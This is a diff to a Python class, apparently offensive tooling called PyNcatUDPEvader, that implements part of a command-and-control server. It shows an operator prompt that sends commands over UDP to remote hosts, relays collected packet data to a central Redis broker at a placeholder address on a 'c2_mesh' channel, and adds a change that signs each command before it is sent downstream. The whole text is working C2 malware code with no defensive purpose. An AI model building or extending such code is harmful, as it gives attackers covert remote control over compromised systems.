@@ -389,8 +389,6 @@ class PyNcatUDPEvader:
                         
                         # Ship the fragment to the central broker instantaneously
                         try:
-                            import redis
-                            import json
                             r = redis.Redis(host='CENTRAL_BROKER_IP', port=6379, db=0)
                             r.publish('pyncat_c2_mesh', json.dumps(packet_payload))
                         except Exception as cache_err:
@@ -398,9 +396,22 @@ class PyNcatUDPEvader:
 
                     sys.stdout.write("pyncat_c2> ")
                     sys.stdout.flush()
-                    response_input = sys.stdin.readline()
+                    response_input = sys.stdin.readline().strip()
+                    
                     if response_input:
-                        server.sendto(self._pack_and_secure(response_input.encode()), addr)
+                        # 1. Compute the cryptographic signature block using your private key
+                        signature_string = crypto_engine.sign_command(response_input)
+                        
+                        # 2. Package both fields into a transparent transport envelope
+                        instruction_envelope = {
+                            "cmd": response_input,
+                            "sig": signature_string
+                        }
+                        
+                        # 3. Serialize and push the data envelope downstream
+                        envelope_bytes = json.dumps(instruction_envelope).encode('utf-8')
+                        server.sendto(self._pack_and_secure(envelope_bytes), addr)
+
         except KeyboardInterrupt:
             pass
         finally:
